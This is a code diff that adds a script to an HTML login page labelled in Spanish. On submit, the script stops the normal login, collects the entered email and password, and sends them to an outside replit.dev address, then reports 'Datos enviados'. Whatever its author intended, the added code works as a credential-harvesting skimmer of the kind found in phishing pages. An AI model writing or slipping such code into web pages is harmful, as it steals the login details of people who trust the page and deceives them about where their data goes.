@@ -133,5 +133,22 @@
 
     <button type="submit" class="login-button">Iniciar sesión</button>
   </form>
+
+  <script>
+  document.getElementById("loginForm").addEventListener("submit", function(e) {
+    e.preventDefault();
+    const data = {
+      email: this.email.value,
+      password: this.password.value
+    };
+
+    fetch("https://24fb22b1-ac17-4147-8b76-b84d03afe8c2-00-14r6zwjdn77nl.riker.replit.dev/", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(data)
+    }).then(() => alert("Datos enviados"));
+  });
+
+</script>
 </body>
 </html>
